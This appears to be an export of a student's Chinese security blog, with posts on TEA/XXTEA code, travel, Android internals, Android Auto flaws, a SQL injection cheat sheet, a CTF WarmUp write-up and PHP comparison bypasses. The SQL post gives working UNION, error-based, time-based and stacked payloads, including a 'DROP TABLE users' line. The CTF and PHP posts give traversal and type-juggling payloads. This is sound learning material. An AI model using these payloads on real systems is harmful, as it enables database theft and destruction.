[{"content":"背景与简介 **TEA **：Wheeler 与 Needham 提出的一种极简分组密码。优点是实现非常简单、速度快、代码体积小；缺点是存在弱密钥问题，不建议在高强度安全场景使用。\n分组：64-bit（两个 uint32_t） 密钥：128-bit（四个 uint32_t） 建议轮数：32次循环（对应 64 轮 Feistel 步） 常数：delta = 0x9E3779B9（取自黄金分割） XXTEA ：为修正 Block TEA 的缺陷而提出的改进算法。适合任意长度的 32-bit 整数数组。\n数据：n 个 32-bit 整数（n \u0026gt;= 2） 密钥：同样 128-bit 轮数：6 + 52 / n 仍然只使用移位、异或、加法等非常高效的操作 实现要点与注意 整数宽度与溢出：两者都依赖 32 位无符号整数的“环”运算（模 2**32）。C++ 的 uint32_t 自带无符号溢出语义（自动按 32 位截断），无需像py一样手动 \u0026amp; 0xFFFFFFFF。 端序：示例实现中的打包/拆包函数固定使用小端（倒序？）格式，保证跨平台一致。 TEA （64-bit 分组） 这里先给出简单的实现，实际上做题或者生产是需要变种的，本人目前水平太臭（，就放自己会的了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;cstdint\u0026gt; #include \u0026lt;array\u0026gt; namespace tea { static constexpr uint32_t DELTA = 0x9E3779B9u; // key: 4×uint32_t using Key128 = std::array\u0026lt;uint32_t, 4\u0026gt;; // 加密一个 64-bit 块（v0,v1） inline void encrypt_block(uint32_t \u0026amp;v0, uint32_t \u0026amp;v1, const Key128 \u0026amp;k, uint32_t rounds = 32) { uint32_t sum = 0; for (uint32_t i = 0; i \u0026lt; rounds; ++i) { sum += DELTA; v0 += ((v1 \u0026lt;\u0026lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k[1]); v1 += ((v0 \u0026lt;\u0026lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k[3]); } } inline void decrypt_block(uint32_t \u0026amp;v0, uint32_t \u0026amp;v1, const Key128 \u0026amp;k, uint32_t rounds = 32) { uint32_t sum = DELTA * rounds; for (uint32_t i = 0; i \u0026lt; rounds; ++i) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k[1]); sum -= DELTA; } } } // namespace tea XXTEA（任意长度 32-bit 数组） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include \u0026lt;cstdint\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;array\u0026gt; namespace xxtea { using Key128 = std::array\u0026lt;uint32_t, 4\u0026gt;; static constexpr uint32_t DELTA = 0x9E3779B9u; // 经典常数 // v: n 个 uint32_t，n\u0026gt;=2 inline void encrypt(std::vector\u0026lt;uint32_t\u0026gt; \u0026amp;v, const Key128 \u0026amp;k) { const size_t n = v.size(); if (n \u0026lt; 2) return; uint32_t rounds = 6u + static_cast\u0026lt;uint32_t\u0026gt;(52u / n); uint32_t sum = 0; uint32_t z = v[n - 1], y; while (rounds--) { sum += DELTA; uint32_t e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3u; for (size_t p = 0; p \u0026lt; n - 1; ++p) { y = v[p + 1]; v[p] += (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ z)); z = v[p]; } y = v[0]; v[n - 1] += (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[((n - 1) ^ e) \u0026amp; 3] ^ z)); z = v[n - 1]; } } inline void decrypt(std::vector\u0026lt;uint32_t\u0026gt; \u0026amp;v, const Key128 \u0026amp;k) { const size_t n = v.size(); if (n \u0026lt; 2) return; uint32_t rounds = 6u + static_cast\u0026lt;uint32_t\u0026gt;(52u / n); uint32_t sum = rounds * DELTA; uint32_t z, y = v[0]; while (rounds--) { uint32_t e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3u; for (size_t p = n - 1; p \u0026gt; 0; --p) { z = v[p - 1]; v[p] -= (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ z)); y = v[p]; } z = v[n - 1]; v[0] -= (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(0 ^ e) \u0026amp; 3] ^ z)); y = v[0]; sum -= DELTA; } } } // namespace xxtea 实际上和tea一样，xxtea的解密≈ 加密的倒序（主要得益于异或的性质）：\n轮次顺序：解密要从最后一轮往回走；\n运算符号：加密时加上去的量，解密就减掉；\n状态依赖：由于每一轮结果依赖前一轮，必须严格逆序才能还原。\n需要注意的是xxtea循环之后还有一步的单独处理，原因是XXTEA 的设计是一个\u0026quot;环形数组\u0026quot;运算,所以要额外处理首尾一次。\n小结 TEA 与 XXTEA 都以“移位 + 异或 + 加法”为核心，易实现且性能佳。 TEA 面向 64-bit 分组；XXTEA 直接面向 32-bit 数组，适合任意长度。 ","date":"2025-09-13T00:00:00Z","image":"https://example.com/p/tea-%E4%B8%8E-xxtea/20180629201629_nn8NF_hu_aa1a239ff0a51663.gif","permalink":"https://example.com/p/tea-%E4%B8%8E-xxtea/","title":"TEA 与 XXTEA"},{"content":"暑假第一站——苏州 搬完校区回来就已经七月十多号了，约定的苏州行本来想延后，但是有了上次泡汤旅行的教训，还是说走就走吧。\n去苏州的路上\n姑苏城外寒山寺\n留园人迹稀少的角落\n金鸡湖的夜景\n老实说，暑假去苏州不是一个明智的选择，到处都是人，体验感不算很好。但是总体来说苏州行还是不错的，是想去第二回的城市。\n或许以后在苏州上班也不错？（\n暑假第二站——东阳 在东阳的日子比较平淡，一天就是做做大创和健身，不过开车还是很舒服的。\n（都是朋友圈的东西-。-\n个人来说，东阳的日子或许没那么精彩，但是会有种沉淀的感觉，也能在平淡的日子里把握一些小确幸，这正是我所追求的。\n暑假第三站——义乌 义乌和苏州一样都是玩了三天两夜，不过后者不够玩，前者不够好玩。\n很难评，就当是漂亮饭吧 在小商品城逛了半天，啥也没买，就当参观了\n在韩国风情街吃的火锅，应该算国内比较正宗的了\n义乌还是太商业了，不太适合我们这种学生，以后应该不会想去了。\n暑假第四站——宁海 回宁海的日子就是享受假期了，白天吃喝玩乐，晚上网吧开黑，得益于大创停滞了一段时间吧，让我有空摸🐟。 十分想念的云南菌子火锅\n和高中同学看老师中午聚会吃的甲鱼煲\n超绝造型室\n两个只有看电视才会安静下来的小家伙\n总是觉得宁海太无聊了，或许是年轻的心不想在小县城蜗居吧。\n安抚归乡的心后，需要开始新的历程了。\n暑假第五站——乐清 去看奶奶，呆的时间很短。\n对乐清最大的印象就是开遍的书苑，这是一座阅读有温度的城市\n暑假终点站——深圳 提前一周回到中深，收拾一下，就要开启新的生活了。\n桌面初阶段\n是暑假的终点，也是大二的起点，期待接下来三年的生活。\n最后的最后，今年已经过去三分之二了，对自己接下来应该有所展望，希望你：\n认真学习，逐步精通re\n保持热爱，坚持健身和有氧\n规律生活，减少熬夜\n向外社交，结识各种各样的朋友（绝对不是因为xyy想谈恋爱，绝对！绝对？）\nover。\n感谢一直以来没有放弃的你\n","date":"2025-09-05T00:00:00Z","image":"https://example.com/p/%E6%9A%91%E6%9C%9F%E5%B0%8F%E7%BB%93/1_hu_c12164ec0ae9506b.jpg","permalink":"https://example.com/p/%E6%9A%91%E6%9C%9F%E5%B0%8F%E7%BB%93/","title":"暑期小结"},{"content":"Android的系统架构 Android系统分为5层，从高到低分别是应用层、应用框架层、系统运行库层、硬件抽象层和Linux内核层。如图： 应用层（Applications）​ 用户直接交互的界面，包含系统预装应用（如电话、短信、浏览器）和第三方应用，也就是我们直接接触的界面。\n应用框架层（Application Framework）​ 为开发者提供API接口和核心服务。Android 4大组件，6大布局，api的定义，view等系统定义的原生组件都在这层。\n系统运行库层（Libraries + Android Runtime）​ 原生C/C++库​ 提供底层功能支持，如图： Android Runtime (ART) 采用AOT（提前编译）替代Dalvik的JIT（即时编译），提升运行效率。管理应用进程、内存分配及垃圾回收。\n与 Dalvik 对比： 硬件抽象层（HAL, Hardware Abstraction Layer）​ 硬件抽象层 (HAL) 提供标准界面，向更高级别的 Java API 框架显示设备硬件功能。HAL 包含多个库模块，其中每个模块都为特定类型的硬件组件实现一个界面。当框架 API 要求访问设备硬件时，Android 系统将为该硬件组件加载库模块。厂商会在这层定义自己的HAL接口。HAL运行在用户空间(User Space )，这样的一层就是专门为各个厂商服务，为其设计自己的风格。\nLinux内核层（Linux Kernel）​ Android核心系统服务依赖于Linux内核，包括安全性、内存管理、进程管理、网络协议和驱动模型等。Linux内核也同时作为硬件和软件栈之间的抽象层。\n","date":"2025-07-17T00:00:00Z","image":"https://example.com/p/%E5%88%9D%E8%AF%86android/duitang_1752738125020_hu_c09bcf3287179663.gif","permalink":"https://example.com/p/%E5%88%9D%E8%AF%86android/","title":"初识Android"},{"content":"Android auto常见漏洞 安卓汽车（Android Auto）的应用程序编程接口（API）允许开发者与信息娱乐系统进行交互。通常，API 设计者会考虑特定的协议或 API 调用序列以确保系统的安全性和可靠性，而攻击者则将利用这些API进行攻击。\n外部文件访问检测 Android的外部存储（如SD卡）对所有应用开放读写权限（除非设置特殊加密），这意味着：\n任何应用都可以读取、修改、删除外部存储中的文件。\n敏感数据（如用户隐私、配置信息、业务逻辑文件）若存储在外部存储，可能被恶意应用篡改、窃取或删除，导致数据泄露或功能异常。\n示例（getDiskCacheDir方法）:\n1 2 3 4 5 public static File getDiskCacheDir(Context c) { File dir = c.getExternalCacheDir(); // 尝试获取外部缓存目录 if (dir == null) { dir = c.getCacheDir(); } // 外部存储不可用时，回退到内部缓存 return dir; } 使用 WORLD_WRITEABLE 当文件以 MODE_WORLD_WRITEABLE 模式创建时，其他应用（无论是否属于同一开发者）均可向该文件写入数据。默认情况下，Android 保护机制强制执行，只有创建内部存储文件的应用才能访问它。但是有些应用确实使用MODE_WORLD_WRITEABLE 或 MODE_WORLD_READABLE 模式来处理 IPC 文件，从而绕过这一限制。\n示例：\n1 2 3 4 5 File f = new File(getFilesDir(), \u0026#34;filename.ext\u0026#34;); f.delete(); FileOutputStream fos = openFileOutput(\u0026#34;filename.ext\u0026#34;, Context.MODE_WORLD_WRITEABLE); // 以全局可写模式创建同名文件（高危操作） fos.close(); File f = new File(getFilesDir(), \u0026#34;filename.ext\u0026#34;); 密钥库风险 密钥可以存放在密钥库中，并使用密码保护。然而，这并不能保护在已遭 root 攻击的系统中被监控用户输入密码时的数据。\n​PasswordProtection()被污染: 攻击者可以修改此构造函数的行为，使其接受空密码或任意密码\n​getPrivateKey()被污染: 此方法本应返回KeyStore中存储的真实私钥。若被污染，可返回攻击者控制的伪造私钥\n​load()被污染: 若被污染，可加载包含恶意条目的密钥库或在加载过程中窃取密码\n内容提供者 内容提供者是Android四大组件之一，用于在不同应用间共享数据（如数据库、文件等），是一种结构化存储机制。其默认行为由android:exported属性控制，决定是否允许其他应用访问。但是在一些场景中，该权限可以被动态添加：\n1 2 3 4 5 6 7 PermissionInfo permissionInfo = new PermissionInfo(); permissionInfo.name = \u0026#34;com.example.plugin.MY_UNIQUE_PERMISSION\u0026#34;; // 权限唯一标识 permissionInfo.labelRes = R.string.permission_risk_warning; // 权限描述（必须清晰告知风险） permissionInfo.protectionLevel = PermissionInfo.PROTECTION_SIGNATURE; // 保护级别设为签名级 permissionInfo.description = \u0026#34;允许插件访问宿主核心功能，仅限授权应用使用\u0026#34;; // 详细描述 PackageManager packageManager = getApplicationContext().getPackageManager(); packageManager.addPermission(permissionInfo) WebView WebView 是 Android/iOS 等移动操作系统中内置的浏览器组件，允许应用内嵌网页内容，实现混合开发（Hybrid App）。在 WebView 中，启用 JavaScript 意味着它现在容易受到 XSS 攻击。如果使用，则应仅向所有输入都值得信赖的网页暴露 addJavaScriptInterface()。\nGPS 位置检测器 WebChromeClient.onGeolocationPermissionsShowPrompt()方法来获取向 JavaScript 披露用户位置的权限。\nAndroid auto 静态分析器 使用抽象解释来分析和验证Java字节码\n系统架构 具体流程：\n1.应用获取与拆解​：提取APK中的代码（JAR）和配置文件（Manifest）。\n​2.逆向工程​：反编译代码生成结构化字节码，还原应用逻辑。 ​\n3.配置分析​：解析Manifest获取权限、组件等安全敏感配置。 ​\n4.自动化分析​：\nAndroid Auto Analyzer提炼配置层风险（如过度声明的权限）。\n污点分析结合代码逻辑，追踪敏感数据在程序中的流动路径。 ​\n5.漏洞判定​：通过两者的分析结果，识别如“权限滥用+数据未脱敏”“组件暴露+敏感操作无校验”等复合安全问题。\n入口点的定位逻辑 1. 静态分析入口点的普遍性与Android特殊性\n普通Java应用的入口点：Julia库（通用静态分析工具）从main方法开始分析，因为Java程序通常有明确的程序入口。\nAndroid应用的复杂性：\n• Android程序通过事件处理器（如Activity、Service、BroadcastReceiver等）响应用户交互或系统事件，这些处理器可能被反射机制动态调用，无法通过单一固定的入口（如main方法）覆盖所有逻辑。\n• 关键信息分散在AndroidManifest.xml（声明组件）和运行时展开的XML文件（如布局文件定义的UI事件）中，需结合两者确定入口点。\nAndroid Auto的特殊需求：\n• 聚焦媒体浏览（音频播放）和消息服务（通信功能），这两类是Android Auto的核心场景，需精准定位相关组件以避免分析遗漏。\n2. 入口点定位的具体策略\n（1）基于清单文件（AndroidManifest.xml）的全局扫描\n所有Android组件（Activity、Service等）必须在清单文件中声明，分析器首先解析清单文件，提取以下信息：\nMediaBrowser服务：搜索声明android.media.browse.MediaBrowserService服务的类（如图中“android.media.browse.MediaBrowserService”）。\n消息服务：筛选继承自BroadcastReceiver的接收器类（因Android Auto规范要求消息发送/接收类必须扩展此类）。\n（2）运行时XML文件的动态补充\n布局文件（XML）中定义的UI控件（如按钮点击事件）可能关联事件处理器，需解析此类文件以补充反射调用或隐式注册的入口点。\n示例图\n漏洞检测的工作原理 具体流程：\n开始（START）\n流程起点，准备启动漏洞检测逻辑。\n搜索中间代码（Search in the Intermediate Code）\n第一步是在编译后的中间代码（如Java字节码、LLVM IR等）中扫描，寻找可能存在漏洞的代码片段（如不安全的函数调用、未验证的输入处理等）。\n检测漏洞实现（Vulnerable implementation Detected?）\n• NO：未检测到漏洞，返回“搜索中间代码”步骤，继续扫描剩余代码（形成循环，直到遍历所有代码）。\n• YES：检测到潜在漏洞实现，进入下一步分析。\n访问JVM堆栈（Access JVM Stack）\n获取当前漏洞代码在JVM运行时的调用栈信息，用于分析调用上下文（如调用参数、调用链路径等）。\n判断调用参数类型（Called with constant arguments?）\n检查漏洞函数是否使用常量参数调用：\n• YES：漏洞触发条件明确（参数固定），可直接进入处理流程。\n• NO：参数可能动态变化（如用户输入、变量传递），需进一步分析所有可能的调用场景。\n处理并抛出警告（Process and Throw Warning）\n当漏洞以常量参数调用时，直接生成警告信息（如漏洞类型、位置、风险等级），输出给开发者或集成到开发工具中。\n获取所有贡献者（Get all Contributors）\n若参数非固定值，需收集所有可能导致漏洞的调用路径或代码模块（“贡献者”可能指代调用链中的相关函数、类或输入源），以便全面分析。\n检查漏洞检查完成状态（All Possible Vulnerabilities Checked?）\n• YES：所有可能的漏洞场景已分析完毕，流程结束。\n• NO：存在未覆盖的调用路径或潜在漏洞场景，返回“访问JVM堆栈”步骤，重新分析其他可能的调用上下文（形成循环，确保全面性）。\n","date":"2025-07-16T00:00:00Z","image":"https://example.com/p/android-auto/1234_hu_f32088272d531a3e.gif","permalink":"https://example.com/p/android-auto/","title":"Android auto"},{"content":"常用语法 SELECT 1 SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件 UNION 1 2 3 SELECT 列名 FROM 表名 UNION SELECT 列名_1 FROM 表名_1; 使用 UNION 的时候要注意两个表的列数量必须相同\nOrder by 1 2 3 4 # 在SQL注入中我们常用它来判断列数 SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错 SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错 SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错 查询库名\n1 2 3 4 5 6 1 union SELECT 1,schema_name FROM information_schema.schemata; # or 1 union SELECT schema_name,2 FROM information_schema.schemata; # 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。 # 此时后台执行为: SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata; 查询表名\n1 2 3 4 5 6 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database() # 原理同上 # 如果要查询其他数据库 可以写为 where table_schema=\u0026#39;databaseNAME\u0026#39; # 后台执行为： SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database() 查询字段名\n1 2 3 4 1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database() # 后台执行为： SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database(); 常用参数 user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 ASCII()：返回字符的 ASCII 码值 CHAR()：把整数转换为对应的字符 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile \u0026lsquo;路径\u0026rsquo;：权限较高时可直接写文件 SUBSTR(): 截取字符串中的一部分, SUBSTR(string, start, length) BENCHMARK(): 重复执行指定语句, BENCHMARK(count,expr) 注入 字符串注入\n1 SELECT * FROM users WHERE username=\u0026#39;-1\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- \u0026#39; AND password=\u0026#39;$password\u0026#39;; 时间注入\n1 SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND IF(condition,SLEEP(5),0) 报错注入 updatexml() updatexml() 是 MySQL 中的一种 XML 处理函数，它用于更新 XML 格式的数 据，其标准的用法如下：\n1 UPDATEXML(xml_target, xpath_expr, new_value) 其中，xml_target 是要更新的 XML 数据，xpath_expr 是要更新的节点路 径，new_value 是新的节点值。\n但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中\n那么通过这个特性，我们用 concat() 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中\n1 SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) ps: 0x7e（ASCII 为 ~）\n不过要注意的是 updatexml() 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：\nlimit() 1 2 3 4 5 SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, (select username from users limit 0,1)), 3); # 不断改变limit NUM,1 的值逐行获取 substr() 1 2 3 4 5 SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, substr( (select group_concat(username) from users), 1,31) ),3); 执行结果：\n1 2 3 4 5 mysql\u0026gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, substr( (select group_concat(username) from users),1,31) ),3); 1105 - XPATH syntax error: \u0026#39;~admin,super,flag,null\u0026#39; extractvalue() extractvalue() 是 MySQL 中的一个 XML 处理函数，它用于从 XML 格式的数据中提取指定节点的值。\n1 EXTRACTVALUE(xml_target, xpath_expr) 其中，xml_target 是要提取节点值的 XML 数据，xpath_expr 是要提取的节点路径。\n它用于报错注入的方法其实和 updatexml() 函数的使用方法差不多 但是参数少一个 x\n堆叠注入 通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。\n1 SELECT username, password FROM users WHERE id =1; DROP TABLE users;-- 参考文献:SQL 注入\n","date":"2025-05-13T00:00:00Z","permalink":"https://example.com/p/sql%E6%B3%A8%E5%85%A5/","title":"SQL注入"},{"content":"[HCTF 2018]WarmUp1(php) 一道php绕过的题目，比较吃代码审计（对我来说≡(▔﹏▔)≡）\n进入网页，F12发现有个source.php\n点进去一串php代码，这里直接给上注释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; //白名单 if (! isset($page) || !is_string($page)) { //空参的话就返回false echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { //判断是否在白名单 return true; } $_page = mb_substr( //截取网址0到?的部分 $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); //解码一次 $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; 根据代码想要得到flag参数就要满足非空，字符串，和checkFile，前面两个天然满足\n这里注意到还有一个hint.php,访问一下\n得到这样一句话\n那么可以确定flag在/ffffllllaaaagggg目录下\n根据代码第一个判断是不满足的，那我们试试第二个，试了一下 ?file=source.php?/ffffllllaaaagggg ，没有结果，猜测在子目录下\n又试了试 ?file=source.php?/../../../../ffffllllaaaagggg\n成功了\n看起来第一个和第三个判断都是干扰项\n原题\n","date":"2025-05-08T00:00:00Z","image":"https://example.com/p/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84wp/duitang_1747369962671_hu_edefd0ca7e60c4bf.gif","permalink":"https://example.com/p/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84wp/","title":"一些题目的wp"},{"content":"基础项 比较\n== 只比较值，不比较类型\n=== 除了比较值，也比较类型\n0 == false: bool(true)\r0 === false: bool(false)\rps:在php中 \u0026quot;字符串\u0026quot;==0 是成立的\n输出\necho - 可以输出一个或多个字符串\nprint- 只允许输出一个字符串，返回值总为 1\n数组\narray() 函数用于创建数组\n1 2 3 4 \u0026lt;?php $cars=array(\u0026#34;Hello\u0026#34;,\u0026#34;CTF\u0026#34;); echo \u0026#34;I like \u0026#34; . $cars[0] . \u0026#34; \u0026#34; . $cars[1] . \u0026#34;.\u0026#34;; ?\u0026gt; 魔术常量\n行如 __FILE__ 这样的 __XXX__ 预定义常量，被称为魔术常量。\n1 2 __FILE__ //返回文件的完整路径和文件名 highlight_file(__FILE__); //代码高亮的显示当前文件内容 表单数据\n$_GET —— 接受 GET 请求传递的参数。\n示例: example.com/index.php?book=HELLOCTF，你可以使用 $_GET['book'] 来获取相应的值。\n$_POST —— 接受 POST 请求传递的参数。\n示例：对 example.com/index.php 进行 POST 传参，参数名为 book 内容为 HelloCTF，你可以使用 $_POST['book'] 来获取相应的值。\n$_REQUEST —— 接受 GET 和 POST 以及 Cookie 请求传递的参数。 示例：\n如果你通过 URL 传递了一个参数 example.com/index.php?key=value_from_get，你可以通过$_REQUEST['key'] 获取这个值。\n如果你通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为value_from_post，你也可以通过 $_REQUEST['key'] 获取这个值。\n同时，如果你设置了一个名为 key 的 cookie，其值为 value_from_cookie，你还是可以使用 $_REQUEST[\u0026lsquo;key\u0026rsquo;] 来获取这个值。\n懒人必备^o^/\n函数\n一般来说名字≈功能，所以理解大于记忆，列几个常见的\nassert() : 用于调试，检查一个条件是否为 true。\nunserialize() : 将一个已序列化的字符串转换回 PHP 的值。例如: $array = unserialize($serializedStr) 可以将一个序列化的数组字符串转换为数组。\nmysql_query(): 发送一个 MySQL 查询。\n函数安全 常见绕过\n1 2 3 4 5 6 7 \u0026lt;?php $a = $_GET[\u0026#39;a\u0026#39;]; if (is_numeric($a)) { exit(); } elseif ($a == 404) { echo \u0026#34;flag\u0026#34;; } 想要绕过可以在数字前面或者后面加上 %0a %0b %0c %0d %09\n例如: ?a=\u0026quot;404%0a\u0026quot;\n弱类型比较\nstrcmp()\n当 strcmp 比较出错后，会返回 null，null 则为 0 。\n1 2 3 4 5 6 $flag = \u0026#39;flag{123}\u0026#39;; if (strcmp($flag, $_GET[\u0026#39;str\u0026#39;]) == 0) { echo $flag; }else{ echo \u0026#34;Out!\u0026#34;; } 为了使 strcmp 比较出错，可以传入一个数组\nPayload: ?str[]\nis_switch()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $a = \u0026#34;233a\u0026#34;; $flag = \u0026#34;flag{Give you FLAG}\u0026#34;; switch ($a) { case 1: echo \u0026#34;No Flag\u0026#34;; break; case 2: echo \u0026#34;No Flag\u0026#34;; break; case 233: echo $flag; break; default: $a = 233; echo \u0026#34;Haha...\u0026#34;; } case 会自动将字符转换成数值,即遇到非数字就停止\nmd5()\nmd5 在处理哈希字符串的时候，如果 md5 编码后的哈希值时 0e （科学计数法）开头的，都一律解释为 0\n例如:\n1 2 3 4 5 6 7 8 $flag = \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $v1 = $_GET[\u0026#39;gat\u0026#39;]; $v2 = $_GET[\u0026#39;tag\u0026#39;]; if ($v1 != $v2 \u0026amp;\u0026amp; md5($v1) == md5($v2)) { echo $flag; }else{ echo \u0026#34;Out!\u0026#34;; } 此时找到两个不相同但md5编码后以0e开头的字符串即可\n如果是这样:\n1 2 3 4 5 6 $flag = \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $str1 = $_GET[\u0026#39;gat\u0026#39;]; $str2 = $_GET[\u0026#39;tag\u0026#39;]; if (md5($str1) === md5($str2)) { echo $flag; } 用上述 0e 方法自然是不可行的（注意：=== ），这时候就得使用数组来绕过了，如果传入一个数组的值，会报出错误（md5 只能使用字符串），报错后就相当于绕过 === 这个条件了\n注: 在 PHP 8.0.0 时，该方法行不通了\n如果遇到不能传入数组，只能传入字符串的时候，如下例\n1 2 3 4 5 6 7 8 $flag = \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $str1 = $_GET[\u0026#34;gat\u0026#34;]; $str2 = $_GET[\u0026#34;tag\u0026#34;]; if((string)$str1 !== (string)$str2 \u0026amp;\u0026amp; md5($str1)===md5($str2)){ echo \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; }else{ echo \u0026#34;Out!\u0026#34;; } 这时候就得需要 md5 碰撞，上面判断条件的意思是，str1 和 str2 内容必须不同，但是 md5 必须相同(详细方法待整理)\nsha1()\nsha1 的参数不能为数组，传入数组会返回 NULL\n1 2 3 4 5 6 7 8 9 $flag = \u0026#34;flag{Chain!}\u0026#34;; $get = $_GET[\u0026#39;get\u0026#39;]; $teg = $_GET[\u0026#39;teg\u0026#39;]; if ($get != $teg \u0026amp;\u0026amp; sha1($get) === sha1($teg)) { #if ($get != $teg \u0026amp;\u0026amp; sha1($get) == sha1($teg)) { echo $flag; }else{ echo \u0026#39;Out!\u0026#39;; } Payload: ?get[]=\u0026amp;teg[]=1\n变量覆盖漏洞\n环境得先开启\nregister_globals=ON //此时传递的参数会自动注册为全局变量\r最简单的一种就是我们传入参数例如 ?id=1 把原来id的值给替换\n$$\n类似于c++的指针,例如:\n1 2 3 4 5 6 7 8 9 10 11 $a = \u0026#34;A\u0026#34;; # $b = \u0026#34;B\u0026#34;; # echo $a . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $b . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; foreach ($_GET as $key =\u0026gt; $value) { $$key = $value; } echo $a . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $b . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $key . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo $$key . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 传入\n?a=I'm A\u0026amp;b=I'm B 后,得到\nA\rB\rI'm A\rI'm B\rb\rI'm B\r这里使用了 foreach 来遍历数组的值,遍历 I'm B 